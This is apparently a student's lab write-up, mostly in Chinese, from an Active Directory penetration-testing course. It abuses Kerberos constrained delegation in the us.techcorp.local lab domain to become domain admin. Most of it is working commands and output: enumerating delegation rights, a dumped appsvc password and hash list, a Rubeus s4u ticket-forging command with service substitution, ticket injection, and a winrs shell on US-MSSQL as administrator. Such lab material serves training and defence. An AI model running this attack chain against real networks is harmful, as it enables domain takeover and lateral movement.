Task
•  Abuse Constrained delegation in us.techcorp.local to escalate privileges on a machine to Domain Admin.

使用 Active Directory module枚举约束委派机器

```
PS C:\Users\studentuser138> Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll
PS C:\Users\studentuser138> Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
PS C:\Users\studentuser138> Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo


DistinguishedName        : CN=appsvc,CN=Users,DC=us,DC=techcorp,DC=local
msDS-AllowedToDelegateTo : {CIFS/us-mssql.us.techcorp.local, CIFS/us-mssql}
Name                     : appsvc
ObjectClass              : user
ObjectGUID               : 4f66bb3a-d07e-40eb-83ae-92abcb9fc04c

DistinguishedName        : CN=US-MGMT,OU=Mgmt,DC=us,DC=techcorp,DC=local
msDS-AllowedToDelegateTo : {cifs/US-MSSQL.us.techcorp.local, cifs/US-MSSQL}
Name                     : US-MGMT
ObjectClass              : computer
ObjectGUID               : 6f7957b5-d229-4d00-8778-831aa4d9afac


```

留意有一个CIFS/us-mssql.us.techcorp.local的委托服务给到appsvc这个用户

在前面的章节已经拿到了appsvc这个用户的哈希
```
Authentication Id : 0 ; 78626 (00000000:00013322)
Session           : Service from 0
User Name         : appsvc
Domain            : US
Logon Server      : US-DC
Logon Time        : 7/25/2022 3:28:07 AM
SID               : S-1-5-21-210670787-2521448726-163245708-4601

         * Username : appsvc
         * Domain   : US.TECHCORP.LOCAL
         * Password : Us$rT0AccessDBwithImpersonation
         * Key List :
           aes256_hmac       b4cb0430da8176ec6eae2002dfa86a8c6742e5a88448f1c2d6afc3781e114335
           aes128_hmac       14284e4b83fdf58132aa2da8c1b49592
           rc4_hmac_nt       1d49d390ac01d568f0ee9be82bb74d4c
           rc4_hmac_old      1d49d390ac01d568f0ee9be82bb74d4c
           rc4_md4           1d49d390ac01d568f0ee9be82bb74d4c
           rc4_hmac_nt_exp   1d49d390ac01d568f0ee9be82bb74d4c
           rc4_hmac_old_exp  1d49d390ac01d568f0ee9be82bb74d4c
```

使用aes的哈希ptt

```
C:\AD\Tools\Rubeus.exe s4u /user:appsvc /aes256:b4cb0430da8176ec6eae2002dfa86a8c6742e5a88448f1c2d6afc3781e114335 /impersonateuser:administrator /msdsspn:CIFS/us-mssql.us.techcorp.local /altservice:HTTP /domain:us.techcorp.local /ptt
```
上面命令执行完，在当前shell已注入ticket，klist查看

```
PS C:\Users\studentuser138> klist

Current LogonId is 0:0xbc4200

Cached Tickets: (1)

#0>     Client: administrator @ US.TECHCORP.LOCAL
        Server: HTTP/us-mssql.us.techcorp.local @ US.TECHCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
        Start Time: 11/1/2022 23:26:54 (local)
        End Time:   11/2/2022 9:26:54 (local)
        Renew Time: 11/8/2022 23:26:54 (local)
        Session Key Type: AES-128-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called:
```

横向到us-mssql，注意现在我们现在已是域管理员的身份
```
PS C:\Users\studentuser138> winrs -r:us-mssql.us.techcorp.local cmd.exe
Microsoft Windows [Version 10.0.17763.2928]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\administrator.US>whoami
whoami
us\administrator

C:\Users\administrator.US>hostname
hostname
US-MSSQL
```